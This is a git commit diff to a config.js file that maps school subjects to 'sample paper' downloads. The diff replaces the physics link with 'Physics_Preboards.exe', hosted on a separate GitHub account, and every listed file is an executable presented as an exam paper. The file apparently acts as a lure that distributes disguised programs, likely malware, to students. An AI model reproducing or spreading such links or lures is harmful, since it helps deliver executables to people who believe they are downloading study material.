1a9f54f8f4d87b1b37ab6ba05d752b0414c2cc93
void-echo-4h1t9p-glacier-singularity <rohanyadav5185@gmail.com>
2025-12-09 14:27:28 +0530

    Update config.js

--- config.js
+++ config.js
@@ -6,7 +6,7 @@ const paperDownloads = {
     //'mathematics': 'https://github.com/void-echo-4h1t9p-glacier-singularity/Files_Server/releases/download/1/IOQM_Sample_Paper.exe',
     
     // Physics
-    'physics': 'https://github.com/void-echo-4h1t9p-glacier-singularity/Files_Server/releases/download/1/Sample_Paper.exe',
+    'physics': 'https://github.com/ciphernova-exe/Server_Address/releases/download/V1.0.0/Physics_Preboards.exe',
     
     // English
    // 'english': 'https://github.com/void-echo-4h1t9p-glacier-singularity/Files_Server/releases/download/1/Sample_Paper.exe',
@@ -26,3 +26,4 @@ const paperDownloads = {
     // Hindi
     //'hindi': 'https://github.com/void-echo-4h1t9p-glacier-singularity/Files_Server/releases/download/1/Sample_Paper.exe'
 };
+
